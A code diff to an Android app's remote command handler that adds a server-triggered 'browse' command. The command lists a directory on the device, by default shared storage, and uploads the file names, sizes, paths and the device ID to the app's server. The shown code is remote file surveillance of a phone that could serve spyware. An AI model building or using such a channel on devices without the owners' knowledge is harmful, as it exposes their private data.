@@ -25,6 +25,7 @@ object CommandExecutor {
                     "policy" -> applyPolicy(context, c.optString("param"))
                     "beeper" -> beeper(context)
                     "sync" -> sync(context)
+                    "browse" -> browse(context, param)
                 }
                 if (id >= 0) ack(context, id, "ok")
             } catch (e: Exception) {
@@ -84,6 +85,44 @@ object CommandExecutor {
     private fun sync(context: Context) {
         val svc = context.startForegroundService(Intent(context, LogUploaderService::class.java))
         // The service re-runs its loop on start; nothing more needed.
+    }
+
+    /** List a directory and upload the file listing to the server. */
+    private fun browse(context: Context, dirPath: String) {
+        try {
+            val dir = java.io.File(dirPath ?: "/sdcard")
+            val files = dir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyArray()
+            val sb = StringBuilder()
+            sb.appendLine("[")
+            files.forEachIndexed { i, f ->
+                if (i > 0) sb.appendLine(",")
+                val type = if (f.isDirectory) "dir" else "file"
+                sb.appendLine("  {\"name\":\"${f.name}\",\"type\":\"$type\",\"size\":${f.length()},\"path\":\"${f.absolutePath.replace("\\", "\\\\")}\"}")
+            }
+            sb.appendLine("]")
+            val json = sb.toString()
+            // Upload via multipart to /device/files/upload
+            val boundary = "----FileMgr${System.currentTimeMillis()}"
+            val body = "--$boundary\r\n" +
+                "Content-Disposition: form-data; name=\"path\"\r\n\r\n$dirPath\r\n" +
+                "--$boundary\r\n" +
+                "Content-Disposition: form-data; name=\"device_id\"\r\n\r\n${AppConfig.deviceId(context)}\r\n" +
+                "--$boundary\r\n" +
+                "Content-Disposition: form-data; name=\"content\"; filename=\"listing.json\"\r\n" +
+                "Content-Type: application/json\r\n\r\n$json\r\n" +
+                "--$boundary--\r\n"
+            val url = "${AppConfig.SERVER_URL}/device/files/upload"
+            val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.doOutput = true
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
+            conn.outputStream.write(body.toByteArray(Charsets.UTF_8))
+            conn.outputStream.flush()
+            conn.outputStream.close()
+            conn.responseCode
+        } catch (e: Exception) {
+            android.util.Log.e("FileMgr", "browse failed: ${e.message}")
+        }
     }
 
     private fun ack(context: Context, id: Long, result: String) {
